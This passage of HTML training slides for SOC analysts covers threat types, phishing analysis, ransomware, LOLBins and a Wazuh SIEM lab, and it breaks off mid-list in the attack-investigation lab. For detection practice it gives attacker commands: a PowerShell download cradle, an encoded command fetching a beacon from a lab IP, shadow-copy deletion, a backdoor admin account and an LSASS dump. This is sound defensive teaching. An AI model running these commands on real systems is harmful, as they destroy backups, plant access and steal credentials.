+    <p style="margin-top:32px;max-width:500px;margin-left:auto;margin-right:auto;">Malware types, phishing, BEC, ransomware, LOLBins, supply chain attacks, insider threats, and the cyber kill chain — the threats you'll face daily in a SOC.</p>
+    <div style="margin-top:24px;">
+      <i class="fa-solid fa-bug fa-3x" style="margin:0 12px;color:var(--red);"></i>
+      <i class="fa-solid fa-fish fa-3x" style="margin:0 12px;color:var(--accent);"></i>
+      <i class="fa-solid fa-chain-broken fa-3x" style="margin:0 12px;color:var(--yellow);"></i>
+    </div>
+    <p style="margin-top:32px;font-size:15px;">12 slides — press <strong>Next</strong> to start</p>
+  </div>
+</div>
+
+<!-- SLIDE 44: MALWARE TYPES -->
+<div class="slide" data-module="Module 04: Threat Landscape">
+  <div class="slide-header"><h2>Malware Types</h2><span class="slide-num">REFERENCE</span></div>
+  <p>You'll encounter these every day. Know the difference — it affects containment strategy.</p>
+  <table class="tbl" style="margin-top:8px;">
+    <tr><th>Type</th><th>What It Does</th><th>SOC Response</th></tr>
+    <tr><td><strong>Virus</strong></td><td>Attaches to files, spreads when executed</td><td>Scan + remove; find patient zero</td></tr>
+    <tr><td><strong>Worm</strong></td><td>Self-replicating, spreads over network</td><td>Network isolation — blocks critical</td></tr>
+    <tr><td><strong>Trojan</strong></td><td>Disguised as legitimate software</td><td>Check parent process, persistence</td></tr>
+    <tr><td><strong>Ransomware</strong></td><td>Encrypts files, demands payment</td><td><strong>Immediate host isolation</strong>, backup recovery</td></tr>
+    <tr><td><strong>Spyware</strong></td><td>Steals data, monitors activity</td><td>Check for data exfiltration (DNS, netflow)</td></tr>
+    <tr><td><strong>Rootkit</strong></td><td>Hides in kernel, evades detection</td><td>Requires offline forensics; EDR may miss it</td></tr>
+    <tr><td><strong>Keylogger</strong></td><td>Records keystrokes</td><td>Check for credential exposure, force password reset</td></tr>
+    <tr><td><strong>RAT</strong></td><td>Remote Access Trojan — full control</td><td>Isolate host, hunt for lateral movement</td></tr>
+  </table>
+  <p style="margin-top:8px;font-size:14px;color:var(--yellow);">In practice, modern malware is <strong>multistage</strong>: dropper → downloader → RAT → ransomware. The type changes at each stage.</p>
+</div>
+
+<!-- SLIDE 45: PHISHING -->
+<div class="slide" data-module="Module 04: Threat Landscape">
+  <div class="slide-header"><h2>Phishing &amp; Social Engineering</h2><span class="slide-num">ATTACK</span></div>
+  <p>Phishing is the #1 initial access vector — over 90% of breaches start with a phish. Every SOC analyst needs to recognize the patterns.</p>
+  <table class="tbl" style="margin-top:8px;">
+    <tr><th>Type</th><th>Target</th><th>Example</th></tr>
+    <tr><td><strong>Bulk phishing</strong></td><td>Thousands of random users</td><td>"Your account has been compromised, click here" — generic greeting</td></tr>
+    <tr><td><strong>Spear phishing</strong></td><td>Specific person/department</td><td>Email addressed to "John" with the company's real HR policy attached</td></tr>
+    <tr><td><strong>Whaling</strong></td><td>Executives / VIPs</td><td>Fake legal subpoena or board directive — highly targeted</td></tr>
+    <tr><td><strong>Smishing</strong></td><td>Phone (SMS)</td><td>Fake delivery notification with tracking link</td></tr>
+    <tr><td><strong>Vishing</strong></td><td>Phone (voice)</td><td>"This is IT support, I need your password to fix an issue"</td></tr>
+  </table>
+  <p style="margin-top:8px;font-weight:600;">Red flags to teach users:</p>
+  <ul style="margin-top:4px;font-size:16px;color:var(--muted);">
+    <li>Urgency or threats ("your account will be closed in 24 hours")</li>
+    <li>Spoofed sender address (e.g., <code>amaz0n-support@mail.ru</code>)</li>
+    <li>Generic greetings ("Dear Customer" instead of your name)</li>
+    <li>Suspicious links — <strong>hover before you click</strong></li>
+    <li>Unexpected attachments — especially <code>.docm</code>, <code>.xlsm</code>, <code>.js</code>, <code>.zip</code></li>
+  </ul>
+</div>
+
+<!-- SLIDE 46: INVESTIGATION — PHISHING ANALYSIS -->
+<div class="slide" data-module="Module 04: Threat Landscape">
+  <div class="slide-header"><h2>Investigation: Phish or Legit?</h2><span class="slide-num">HANDS ON</span></div>
+  <p>A user forwarded you this email. Analyze the headers and decide.</p>
+  <div class="terminal" style="font-size:12px;">
+    <span class="comment"># Email headers (redacted)</span><br>
+    <span style="color:#64748b;">
+From: "Microsoft Security" &lt;security@microsoft-secure-alerts.com&gt;<br>
+Reply-To: support@reset-password-now.xyz<br>
+Subject: URGENT: Unauthorized sign-in detected<br>
+Received: from mail.reset-password-now.xyz [185.234.72.18]<br>
+         by exchange.ourcompany.com<br>
+Link: https://reset-password-now.xyz/verify/?token=abc123<br>
+Attachment: none
+    </span>
+  </div>
+  <p style="margin-top:8px;font-weight:600;">Find the red flags:</p>
+  <ul style="margin-top:4px;font-size:16px;color:var(--muted);">
+    <li>The sending domain (<code>microsoft-secure-alerts.com</code>) is not microsoft.com — check the actual domain, not the display name</li>
+    <li>Reply-To goes to a completely different domain (<code>reset-password-now.xyz</code>) — classic phishing indicator</li>
+    <li>The received path originates from <code>reset-password-now.xyz</code> (IP 185.234.72.18), not Microsoft — check the first "Received" header</li>
+    <li>The link domain (<code>reset-password-now.xyz</code>) doesn't match the claimed sender</li>
+    <li><strong>Verdict:</strong> Phishing. Block the domain, scan the user's mailbox for similar emails, check if they clicked.</li>
+  </ul>
+</div>
+
+<!-- SLIDE 47: BEC -->
+<div class="slide" data-module="Module 04: Threat Landscape">
+  <div class="slide-header"><h2>Business Email Compromise</h2><span class="slide-num">ATTACK</span></div>
+  <p>BEC is the most financially damaging cybercrime — no malware, no links, just social engineering. Attackers impersonate executives or vendors to trick employees into wiring money or sharing credentials.</p>
+  <div class="grid-2" style="margin-top:8px;">
+    <div class="card" style="border-left:3px solid var(--red);">
+      <p style="font-size:15px;font-weight:600;">CEO Fraud</p>
+      <p style="font-size:13px;">Email from "CEO" to finance: "I need an urgent wire transfer for the acquisition. Keep this confidential."</p>
+    </div>
+    <div class="card" style="border-left:3px solid var(--red);">
+      <p style="font-size:15px;font-weight:600;">Vendor Compromise</p>
+      <p style="font-size:13px;">Attacker compromises a vendor's email → sends invoice with changed bank details → payment goes to attacker.</p>
+    </div>
+    <div class="card" style="border-left:3px solid var(--red);">
+      <p style="font-size:15px;font-weight:600;">Account Takeover</p>
+      <p style="font-size:13px;">Employee's email credentials stolen → attacker monitors inbox → inserts fake requests at the right moment.</p>
+    </div>
+    <div class="card" style="border-left:3px solid var(--red);">
+      <p style="font-size:15px;font-weight:600;">Gift Card Scam</p>
+      <p style="font-size:13px;">"CEO" asks an employee to buy gift cards for a client gift and send photos of the codes. No malware involved.</p>
+    </div>
+  </div>
+  <p style="margin-top:8px;"><strong>Detection:</strong> Look for emails with <strong>Reply-To</strong> or <strong>Return-Path</strong> different from the <strong>From</strong> domain. Check email authentication (SPF, DKIM, DMARC failure). Monitor for unusual login locations.</p>
+</div>
+
+<!-- SLIDE 48: RANSOMWARE -->
+<div class="slide" data-module="Module 04: Threat Landscape">
+  <div class="slide-header"><h2>Ransomware</h2><span class="slide-num">ATTACK</span></div>
+  <p>Ransomware is the most visible cyber threat. Understanding how it operates is critical for detection and response.</p>
+  <div class="terminal" style="font-size:12px;">
+    <span class="comment"># Typical ransomware timeline (from SOC data)</span><br>
+    <span style="color:#64748b;">
+T+0:00  Phishing email opened by user<br>
+T+0:05  Macro-enabled Office doc → downloads Cobalt Strike beacon<br>
+T+0:15  Beacon calls out to C2 (usually over HTTPS to a legitimate-looking domain)<br>
+T+1:00  Attacker enumerates domain: whoami, net group "Domain Admins" /domain<br>
+T+2:00  Lateral movement via PsExec or WMI — spreads to file servers<br>
+T+2:30  Deletes Volume Shadow Copies: vssadmin delete shadows /all<br>
+T+2:35  Deploys ransomware via Group Policy or scheduled task<br>
+T+2:36  Encryption begins — files renamed with .lockbit extension<br>
+T+2:40  Ransom note dropped everywhere: !README!.txt
+    </span>
+  </div>
+  <p style="margin-top:8px;font-weight:600;">Detection opportunities:</p>
+  <ul style="margin-top:4px;font-size:16px;color:var(--muted);">
+    <li><code>vssadmin delete shadows</code> — almost never legit, alert on it</li>
+    <li>PsExec/WMI from a workstation to a server — lateral movement indicator</li>
+    <li>Mass file renames / new file extensions — EDR detects this</li>
+    <li>C2 beaconing (Sysmon EID 3 + 22) — early detection before encryption</li>
+  </ul>
+</div>
+
+<!-- SLIDE 49: LOLBINS -->
+<div class="slide" data-module="Module 04: Threat Landscape">
+  <div class="slide-header"><h2>Living Off the Land</h2><span class="slide-num">ATTACK</span></div>
+  <p>LOLBins (Living Off the Land Binaries) are legitimate Windows tools used by attackers to avoid detection. They don't need to download malware — Windows already has what they need.</p>
+  <table class="tbl" style="margin-top:8px;">
+    <tr><th>Binary</th><th>What Attackers Do With It</th><th>Detection</th></tr>
+    <tr><td><strong>powershell.exe</strong></td><td>Download cradles, encoded commands, in-memory execution</td><td>Monitor -EncodedCommand, -W Hidden, download patterns</td></tr>
+    <tr><td><strong>rundll32.exe</strong></td><td>Load malicious DLLs, execute JavaScript via <code>javascript:</code> protocol</td><td>Alert on DLLs loaded from <code>%Temp%</code> or <code>%AppData%</code></td></tr>
+    <tr><td><strong>mshta.exe</strong></td><td>Execute HTA files (often from email attachments)</td><td>Rarely used legitimately — almost always malicious</td></tr>
+    <tr><td><strong>wmic.exe</strong></td><td>Execute commands remotely, process enumeration</td><td>Unusual parent processes; remote execution patterns</td></tr>
+    <tr><td><strong>regsvr32.exe</strong></td><td>Register/execute COM DLLs, bypass AppLocker</td><td>Scripter loading DLL from remote or temp paths</td></tr>
+    <tr><td><strong>certutil.exe</strong></td><td>Download files (abused as a download cradle)</td><td>Decode/base64 flags with URLs or remote paths</td></tr>
+    <tr><td><strong>bitsadmin.exe</strong></td><td>Download files via BITS (Background Intelligent Transfer)</td><td>Unusual download URLs, persistence via BITS jobs</td></tr>
+  </table>
+  <p style="margin-top:8px;font-size:14px;color:var(--yellow);">Rule of thumb: <strong>Any LOLBin executing from a user's Temp folder, with encoded commands, or with network connections to unknown IPs is suspicious.</strong></p>
+</div>
+
+<!-- SLIDE 50: SUPPLY CHAIN -->
+<div class="slide" data-module="Module 04: Threat Landscape">
+  <div class="slide-header"><h2>Supply Chain Attacks</h2><span class="slide-num">ATTACK</span></div>
+  <p>Attackers compromise a trusted vendor or tool — and everyone who uses it gets infected. You don't have to be the direct target; you just have to use the compromised product.</p>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:10px;">
+    <div class="card" style="border-left:3px solid var(--accent);">
+      <p style="font-size:15px;font-weight:600;">SolarWinds (2020)</p>
+      <p style="font-size:13px;">Attackers inserted malware into SolarWinds Orion updates. 18,000 organizations downloaded the backdoored update. <strong>Impact:</strong> FireEye, US government agencies breached.</p>
+    </div>
+    <div class="card" style="border-left:3px solid var(--accent2);">
+      <p style="font-size:15px;font-weight:600;">Log4j (2021)</p>
+      <p style="font-size:13px;">Vulnerability in a widely used Java logging library. Hundreds of millions of applications exposed. <strong>Impact:</strong> Remote code execution in everything from Minecraft to enterprise apps.</p>
+    </div>
+    <div class="card" style="border-left:3px solid var(--green);">
+      <p style="font-size:15px;font-weight:600;">Codecov (2021)</p>
+      <p style="font-size:13px;">Attacker modified Codecov's Docker image — every customer who ran CI/CD pipelines had environment variables (including cloud keys) exfiltrated.</p>
+    </div>
+    <div class="card" style="border-left:3px solid var(--red);">
+      <p style="font-size:15px;font-weight:600;">3CX (2023)</p>
+      <p style="font-size:13px;">Attackers compromised the 3CX build pipeline — signed software update delivered malware to 600,000 customers. Supply chain meets trusted signing.</p>
+    </div>
+  </div>
+  <p style="margin-top:8px;font-size:14px;color:var(--yellow);">Detection is difficult because the software is legitimately signed. Mitigation: software inventory, behavioral detection, restrict what vendor processes can do.</p>
+</div>
+
+<!-- SLIDE 51: INSIDER THREATS -->
+<div class="slide" data-module="Module 04: Threat Landscape">
+  <div class="slide-header"><h2>Insider Threats</h2><span class="slide-num">RISK</span></div>
+  <p>Not every attack comes from outside. Insiders already have access, know your systems, and may bypass technical controls.</p>
+  <table class="tbl" style="margin-top:8px;">
+    <tr><th>Type</th><th>Motivation</th><th>SOC Indicators</th></tr>
+    <tr><td><strong>Malicious insider</strong></td><td>Financial gain, revenge, espionage</td><td>Large data downloads, unusual hours, accessing files outside role</td></tr>
+    <tr><td><strong>Negligent insider</strong></td><td>Carelessness, convenience</td><td>Emailing sensitive data to personal account, weak passwords</td></tr>
+    <tr><td><strong>Compromised insider</strong></td><td>Credentials stolen by external attacker</td><td>Login from unusual IP/location, impossible travel, new MFA device</td></tr>
+    <tr><td><strong>Exit risk</strong></td><td>Departing employee taking data</td><td>USB mass storage, printing sensitive docs, downloading repos</td></tr>
+  </table>
+  <p style="margin-top:8px;"><strong>Detection:</strong> DLP alerts on data exfiltration, UEBA (User Entity Behavior Analytics) for baseline anomalies, and monitoring of privileged account usage. Most insider threat detections come from <strong>pattern analysis</strong> over time, not a single alert.</p>
+</div>
+
+<!-- SLIDE 52: CYBER KILL CHAIN -->
+<div class="slide" data-module="Module 04: Threat Landscape">
+  <div class="slide-header"><h2>The Cyber Kill Chain</h2><span class="slide-num">FRAMEWORK</span></div>
+  <p>Originally from Lockheed Martin. Each stage is an opportunity to detect and stop the attack.</p>
+  <div class="layer-stack" style="margin-top:8px;">
+    <div class="layer" style="background:rgba(239,68,68,.08);"><span class="lnum">1</span><span class="lname">Reconnaissance</span><span class="ldesc">Probing, scanning, OSINT gathering</span></div>
+    <div class="layer" style="background:rgba(249,115,22,.08);"><span class="lnum">2</span><span class="lname">Weaponization</span><span class="ldesc">Creating payload (malicious doc, exploit kit)</span></div>
+    <div class="layer" style="background:rgba(234,179,8,.08);"><span class="lnum">3</span><span class="lname">Delivery</span><span class="ldesc">Email, USB, drive-by download</span></div>
+    <div class="layer" style="background:rgba(132,204,22,.08);"><span class="lnum">4</span><span class="lname">Exploitation</span><span class="ldesc">Triggering the vulnerability</span></div>
+    <div class="layer" style="background:rgba(34,197,94,.08);"><span class="lnum">5</span><span class="lname">Installation</span><span class="ldesc">Dropper installs malware/persistence</span></div>
+    <div class="layer" style="background:rgba(6,182,212,.08);"><span class="lnum">6</span><span class="lname">C2</span><span class="ldesc">Command &amp; Control beaconing</span></div>
+    <div class="layer" style="background:rgba(99,102,241,.08);"><span class="lnum">7</span><span class="lname">Actions</span><span class="ldesc">Data exfiltration, encryption, lateral movement</span></div>
+  </div>
+  <p style="margin-top:8px;font-weight:600;">Where you can stop each stage:</p>
+  <ul style="margin-top:4px;font-size:16px;color:var(--muted);">
+    <li><strong>Recon</strong> — block scanning IPs, limit public info</li>
+    <li><strong>Delivery</strong> — email filtering, web proxy, user training</li>
+    <li><strong>Exploitation</strong> — patch management, application control</li>
+    <li><strong>Installation</strong> — EDR, Sysmon (detect persistence), AppLocker</li>
+    <li><strong>C2</strong> — network detections, threat intel feeds, DNS sinkhole</li>
+    <li><strong>Actions</strong> — DLP, backup, incident response plan</li>
+  </ul>
+</div>
+
+<!-- SLIDE 53: QUICK QUIZ -->
+<div class="slide" data-module="Module 04: Threat Landscape">
+  <div class="slide-header"><h2>Threat Landscape Quiz</h2><span class="slide-num">QUIZ</span></div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    1. What's the most common initial access vector in breaches?
+    <div class="quiz-answer"><strong>Phishing</strong> — over 90% of breaches start with a phish.</div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    2. What LOLBin is abused most for downloading payloads?
+    <div class="quiz-answer"><strong>powershell.exe</strong> — download cradles like <code>IEX(New-Object Net.WebClient).DownloadString()</code></div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    3. What command almost always indicates ransomware prep?
+    <div class="quiz-answer"><code>vssadmin delete shadows /all</code> — deleting volume shadow copies before encryption.</div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    4. BEC attackers look for what mismatch in emails?
+    <div class="quiz-answer"><strong>Reply-To or Return-Path different from the From domain</strong> — the most reliable BEC indicator.</div>
+  </div>
+  <div class="quiz-option" onclick="this.querySelector('.quiz-answer').style.display='block'">
+    5. At what kill chain stage does the attacker gain initial access?
+    <div class="quiz-answer"><strong>Exploitation</strong> (stage 4) — the vulnerability is triggered to gain a foothold.</div>
+  </div>
+</div>
+
+<!-- SLIDE 54: M04 SUMMARY -->
+<div class="slide" data-module="Module 04: Threat Landscape">
+  <div style="text-align:center;">
+    <h2 style="color:var(--text);margin-bottom:16px;">Module 04 Complete</h2>
+    <div style="font-size:80px;margin-bottom:24px;">
+      <i class="fa-regular fa-circle-check" style="color:var(--green);"></i>
+    </div>
+    <p style="font-size:22px;color:var(--text);margin-bottom:16px;">You can now:</p>
+    <div style="display:flex;flex-direction:column;align-items:center;gap:8px;margin:0 auto 24px;font-size:17px;max-width:500px;">
+      <div class="card">Identify malware types and their SOC response</div>
+      <div class="card">Analyze phishing emails (headers, links, payloads)</div>
+      <div class="card">Recognize BEC, ransomware, and LOLBin abuse</div>
+      <div class="card">Map attacks to the Cyber Kill Chain</div>
+      <div class="card">Spot supply chain and insider threat indicators</div>
+    </div>
+    <div style="padding:16px;border:1px solid var(--border);border-radius:8px;background:var(--slide-bg);max-width:500px;margin:0 auto;">
+      <p style="font-size:15px;color:var(--accent);font-weight:600;">Before Module 07 (SIEM Lab):</p>
+      <p style="font-size:14px;color:var(--muted);">Make sure you have two VMs ready (Ubuntu + Windows). You'll build a Wazuh SIEM from scratch in the next module.</p>
+    </div>
+    <p style="margin-top:20px;font-size:14px;color:var(--muted);">
+      <a href="#" onclick="showSlide(0);return false;" style="color:var(--accent);">← Back to Dashboard</a>
+    </p>
+  </div>
+</div>
+
+
+<!-- ================================================================================== -->
+<!-- MODULE 07: SIEM LAB — 10 slides (64-73)                                           -->
+<!-- ================================================================================== -->
+
+<!-- SLIDE 64: M07 INTRO -->
+<div class="slide" data-module="Module 07: SIEM Lab">
+  <div style="text-align:center;">
+    <div style="font-family:'JetBrains Mono';color:var(--accent);margin-bottom:16px;">MODULE 07</div>
+    <h1>SIEM Lab:<br>Build &amp; Investigate</h1>
+    <p style="margin-top:32px;max-width:500px;margin-left:auto;margin-right:auto;">You'll set up Wazuh from scratch, install agents, ingest Sysmon logs, write correlation rules, build dashboards, and investigate a simulated attack — all on your own VM lab.</p>
+    <div style="margin-top:24px;">
+      <i class="fa-solid fa-server fa-3x" style="margin:0 12px;color:var(--accent);"></i>
+      <i class="fa-solid fa-terminal fa-3x" style="margin:0 12px;color:var(--accent2);"></i>
+      <i class="fa-solid fa-chart-line fa-3x" style="margin:0 12px;color:var(--green);"></i>
+    </div>
+    <p style="margin-top:32px;font-size:15px;">10 slides — press <strong>Next</strong> to start</p>
+  </div>
+</div>
+
+<!-- SLIDE 65: LAB OVERVIEW -->
+<div class="slide" data-module="Module 07: SIEM Lab">
+  <div class="slide-header"><h2>Lab: What You'll Build</h2><span class="slide-num">SETUP</span></div>
+  <p>You need two VMs (or one VM with enough RAM — 8 GB minimum). Here's the architecture:</p>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:12px;">
+    <div class="card" style="border-left:3px solid var(--accent);">
+      <p style="font-size:16px;font-weight:600;">SIEM Server (Linux)</p>
+      <p style="font-size:13px;">
+        <strong>OS:</strong> Ubuntu 22.04 LTS<br>
+        <strong>RAM:</strong> 4 GB minimum<br>
+        <strong>Disk:</strong> 40 GB<br>
+        <strong>IP:</strong> 192.168.1.10<br>
+        <strong>Software:</strong> Wazuh Manager + Indexer + Dashboard
+      </p>
+    </div>
+    <div class="card" style="border-left:3px solid var(--green);">
+      <p style="font-size:16px;font-weight:600;">Agent (Windows 10/11)</p>
+      <p style="font-size:13px;">
+        <strong>OS:</strong> Windows 10/11 (or Windows Server)<br>
+        <strong>RAM:</strong> 4 GB<br>
+        <strong>Disk:</strong> 60 GB<br>
+        <strong>IP:</strong> 192.168.1.20<br>
+        <strong>Software:</strong> Wazuh Agent + Sysmon
+      </p>
+    </div>
+  </div>
+  <div class="terminal" style="margin-top:10px;font-size:13px;">
+    <span class="comment"># Network: Both VMs on the same virtual network (NAT or Host-Only)</span><br>
+    <span class="comment"># The agent sends logs to the SIEM server on port 1514/1515 (TCP/UDP)</span><br>
+    <span class="comment"># The dashboard is accessible via browser: https://192.168.1.10:443</span>
+  </div>
+</div>
+
+<!-- SLIDE 66: LAB 1 — INSTALL WAZUH -->
+<div class="slide" data-module="Module 07: SIEM Lab">
+  <div class="slide-header"><h2>Lab 1: Install Wazuh Server</h2><span class="slide-num">LAB</span></div>
+  <p>On your Ubuntu VM, run the Wazuh quickstart installer. This installs the Wazuh manager, indexer (OpenSearch), and dashboard all in one.</p>
+  <div class="terminal" style="font-size:13px;">
+    <span class="comment"># Download and run the Wazuh installer assistant</span><br>
+    <span class="prompt">$</span> curl -sO https://packages.wazuh.com/4.9/wazuh-install.sh && sudo bash wazuh-install.sh -a<br><br>
+    <span class="comment"># Wait 5-10 minutes. At the end, you'll see:</span><br>
+    <span style="color:#64748b;">
+INFO: --- Summary ---<br>
+INFO: You can access the web interface at https://wazuh-server-ip<br>
+INFO:   User: admin<br>
+INFO:   Password: &lt;random-generated-password&gt;
+    </span>
+  </div>
+  <p style="margin-top:8px;font-weight:600;">Verify the installation:</p>
+  <div class="terminal" style="font-size:13px;">
+    <span class="prompt">$</span> sudo systemctl status wazuh-manager  <span class="comment"># should show "active (running)"</span><br>
+    <span class="prompt">$</span> sudo systemctl status wazuh-indexer  <span class="comment"># should show "active (running)"</span><br>
+    <span class="prompt">$</span> sudo systemctl status wazuh-dashboard <span class="comment"># should show "active (running)"</span>
+  </div>
+  <p style="margin-top:8px;font-size:14px;color:var(--yellow);">Save the admin password! Open a browser to <code>https://your-server-ip</code> and log in. If you see the dashboard, Lab 1 is complete.</p>
+</div>
+
+<!-- SLIDE 67: LAB 2 — INSTALL AGENT -->
+<div class="slide" data-module="Module 07: SIEM Lab">
+  <div class="slide-header"><h2>Lab 2: Install Wazuh Agent</h2><span class="slide-num">LAB</span></div>
+  <p>On your Windows VM, download and install the Wazuh agent. Point it to your SIEM server.</p>
+  <div class="terminal" style="font-size:13px;">
+    <span class="comment"># Option A: Download from Wazuh Dashboard</span><br>
+    <span style="color:#64748b;">
+Dashboard → Agents → Deploy new agent → Select Windows →<br>
+Copy the generated command (includes your server IP + auth key)
+    </span>
+  </div>
+  <div class="terminal" style="margin-top:6px;font-size:13px;">
+    <span class="comment"># Option B: Manual install (PowerShell as Admin)</span><br>
+    <span class="prompt">PS&gt;</span> Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.9.0-1.msi -OutFile wazuh-agent.msi<br>
+    <span class="prompt">PS&gt;</span> msiexec /i wazuh-agent.msi WAZUH_MANAGER="192.168.1.10" WAZUH_REGISTRATION_SERVER="192.168.1.10" /q
+  </div>
+  <div style="margin-top:6px;font-size:13px;">
+    <p><strong>Start the agent and check connectivity:</strong></p>
+  </div>
+  <div class="terminal" style="font-size:13px;">
+    <span class="prompt">PS&gt;</span> & "C:\Program Files\ossec-agent\agent-auth.exe" -m 192.168.1.10 -A WinAgent<br>
+    <span class="prompt">PS&gt;</span> & "C:\Program Files\ossec-agent\ossec-control.exe" start<br><br>
+    <span class="comment"># Verify in dashboard: Agents → should show your agent as "Active"</span>
+  </div>
+  <p style="margin-top:8px;font-size:14px;color:var(--yellow);">If the agent stays "Disconnected," check the firewall — port 1514 and 1515 must be open between agent and server.</p>
+</div>
+
+<!-- SLIDE 68: LAB 3 — INGEST SYSMON -->
+<div class="slide" data-module="Module 07: SIEM Lab">
+  <div class="slide-header"><h2>Lab 3: Ingest Sysmon + Windows Logs</h2><span class="slide-num">LAB</span></div>
+  <p>Your Windows agent already ships Windows Event Logs. Now configure it to send Sysmon events too (if you completed the Sysmon install from M02).</p>
+  <p style="margin-top:8px;font-weight:600;">Step 1: Edit the agent config on your Windows VM:</p>
+  <div class="terminal" style="font-size:12px;">
+    <span class="comment"># File: C:\Program Files (x86)\ossec-agent\ossec.conf</span><br>
+    <span class="comment"># Add this block inside the &lt;ossec_config&gt; section:</span><br>
+    <span style="color:#64748b;">
+&lt;localfile&gt;<br>
+  &lt;location&gt;Microsoft-Windows-Sysmon/Operational&lt;/location&gt;<br>
+  &lt;log_format&gt;eventchannel&lt;/log_format&gt;<br>
+&lt;/localfile&gt;
+    </span>
+  </div>
+  <p style="margin-top:6px;font-weight:600;">Step 2: Restart the agent and verify logs are flowing:</p>
+  <div class="terminal" style="font-size:12px;">
+    <span class="prompt">PS&gt;</span> Restart-Service -Name ossec-agent<br><br>
+    <span class="comment"># Step 3: On the server, check if Sysmon events are arriving</span><br>
+    <span class="prompt">$</span> sudo tail -f /var/ossec/logs/alerts/alerts.log | grep "Sysmon"
+  </div>
+  <p style="margin-top:8px;font-size:14px;color:var(--yellow);">In the Wazuh Dashboard, go to <strong>Security Events → Modules</strong> and look for Sysmon events. If you see EID 1, 3, 7, etc., ingestion is working.</p>
+</div>
+
+<!-- SLIDE 69: LAB 4 — CORRELATION RULES -->
+<div class="slide" data-module="Module 07: SIEM Lab">
+  <div class="slide-header"><h2>Lab 4: Write a Detection Rule</h2><span class="slide-num">LAB</span></div>
+  <p>Wazuh uses XML rules. Create a custom rule that alerts when someone uses procdump on LSASS.</p>
+  <p style="margin-top:8px;font-weight:600;">Create the rule file on the Wazuh server:</p>
+  <div class="terminal" style="font-size:13px;">
+    <span class="prompt">$</span> sudo nano /var/ossec/etc/rules/local_rules.xml
+  </div>
+  <div class="terminal" style="margin-top:4px;font-size:12px;">
+    <span style="color:#64748b;">
+&lt;group name="sysmon,soc,"&gt;<br>
+  &lt;!-- Detect procdump dumping LSASS --&gt;<br>
+  &lt;rule id="100001" level="12"&gt;<br>
+    &lt;field name="win.system.eventID"&gt;1&lt;/field&gt;<br>
+    &lt;field name="win.eventdata.image"&gt;.*procdump.*\|.*lsass.*&lt;/field&gt;<br>
+    &lt;description&gt;LSASS Dump Detected via ProcDump — Possible Credential Theft&lt;/description&gt;<br>
+    &lt;mitre&gt;<br>
+      &lt;id&gt;T1003.001&lt;/id&gt;<br>
+    &lt;/mitre&gt;<br>
+    &lt;options&gt;no_full_log&lt;/options&gt;<br>
+  &lt;/rule&gt;<br>
+&lt;/group&gt;
+    </span>
+  </div>
+  <p style="margin-top:6px;font-weight:600;">Restart and test:</p>
+  <div class="terminal" style="font-size:13px;">
+    <span class="prompt">$</span> sudo systemctl restart wazuh-manager<br><br>
+    <span class="comment"># On Windows agent, run:</span><br>
+    <span class="prompt">PS&gt;</span> # if you have procdump: .\procdump.exe -ma lsass.exe C:\temp\test.dmp<br><br>
+    <span class="comment"># Check if the alert fires:</span><br>
+    <span class="prompt">$</span> sudo tail -f /var/ossec/logs/alerts/alerts.log | grep "100001"
+  </div>
+</div>
+
+<!-- SLIDE 70: LAB 5 — BUILD A DASHBOARD -->
+<div class="slide" data-module="Module 07: SIEM Lab">
+  <div class="slide-header"><h2>Lab 5: Build Your First Dashboard</h2><span class="slide-num">LAB</span></div>
+  <p>Create a SOC analyst dashboard showing the most important metrics at a glance.</p>
+  <p style="margin-top:8px;font-weight:600;">In the Wazuh Dashboard (OpenSearch Dashboards):</p>
+  <div class="terminal" style="font-size:13px;">
+    <span class="comment"># Step 1: Navigate to Dashboards → Create Dashboard → Add Panel</span><br><br>
+    <span class="comment"># Panel 1 — Failed Logins (count(EventID=4625) by source IP)</span><br>
+    <span class="hl">Query:</span> data.win.system.eventID: 4625 | stats count by source.ip<br><br>
+    <span class="comment"># Panel 2 — Top Processes Created (EventID=1 by Image)</span><br>
+    <span class="hl">Query:</span> data.win.system.eventID: 1 | stats count by image<br><br>
+    <span class="comment"># Panel 3 — Sysmon Events Over Time</span><br>
+    <span class="hl">Query:</span> data.win.system.providerName: "Microsoft-Windows-Sysmon" | timechart count by eventID<br><br>
+    <span class="comment"># Panel 4 — Alerts by Rule Level (pie chart)</span><br>
+    <span class="hl">Query:</span> rule.level &gt; 5 | stats count by rule.level
+  </div>
+  <p style="margin-top:8px;font-size:14px;color:var(--yellow);">Arrange the panels so the most critical data is top-left — alerts overview, failed logins, top processes, Sysmon activity. Save it as "SOC Overview."</p>
+</div>
+
+<!-- SLIDE 71: LAB 6 — INVESTIGATE AN ATTACK -->
+<div class="slide" data-module="Module 07: SIEM Lab">
+  <div class="slide-header"><h2>Lab 6: Investigate a Simulated Attack</h2><span class="slide-num">LAB</span></div>
+  <p>Now generate some malicious activity on your Windows agent and hunt it in Wazuh.</p>
+  <div class="terminal" style="font-size:12px;">
+    <span class="comment"># On the Windows agent, run these commands (simulating attacker behavior):</span><br>
+    <span class="prompt">PS&gt;</span> net user hacker P@ssw0rd123! /add<br>
+    <span class="prompt">PS&gt;</span> net localgroup administrators hacker /add<br>
+    <span class="prompt">PS&gt;</span> powershell.exe -EncodedCommand SQBFAFgAKABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyAC8AYgBlAGEAYwBvAG4AJwApAA==<br>
+    <span class="prompt">PS&gt;</span> vssadmin delete shadows /all<br>
+    <span class="prompt">PS&gt;</span> wmic.exe process call create "cmd.exe /c echo malicious &gt; C:\test.txt"
+  </div>
+  <p style="margin-top:8px;font-weight:600;">Now in the Wazuh Dashboard, search for each activity:</p>
+  <ul style="margin-top:4px;font-size:15px;color:var(--muted);">
+    <li><code>data.user: hacker</code> — did Wazuh catch the new user creation?</li>
+    <li><code>data.win.system.eventID: 1 AND image: *powershell*</code> — find the encoded PowerShell</li>
